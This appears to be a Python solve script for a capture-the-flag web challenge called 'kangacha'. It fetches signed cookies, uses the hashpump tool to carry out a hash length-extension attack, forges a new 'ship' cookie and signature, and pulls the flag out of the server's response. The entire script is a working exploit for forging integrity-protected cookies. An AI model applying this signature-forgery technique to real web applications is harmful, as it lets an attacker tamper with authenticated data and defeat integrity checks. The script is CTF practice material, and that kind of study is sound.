import subprocess
import re
import requests

kangacha_url = "http://ctfq.sweetduet.info:10080/~q31/kangacha.php"
s= requests.Session()

r = s.post(kangacha_url, data = {"submit":"Gacha"})
data = s.cookies["ship"]
signature = s.cookies["signature"]

args = {}
args["data"] = data
args["signature"] = signature
args["key"] = 21
args["append"] = ",10"

cmd = "hashpump -s {signature} -k {key} -d {data} "
cmd += "-a {append}"
cmd = cmd.format(**args)

proc = subprocess.Popen(cmd.strip().split(" "), stdout=subprocess.PIPE)
out, err = proc.communicate()

crack_signature, crack_data = out.decode("utf-8").strip().split("\n")
print(crack_data)
crack_data = crack_data.replace("\\x","%")
s.cookies.clear()
setargs = {"domain":"ctfq.sweetduet.info","path":"/~q31"}
s.cookies.set("ship",crack_data,**setargs)
s.cookies.set("signature",crack_signature,**setargs)
print(crack_data)
print(crack_signature)
r = s.get(kangacha_url)

m = re.search("Yamato \[(?P<flag>.*)\]", r.text)
print(m.group("flag"))
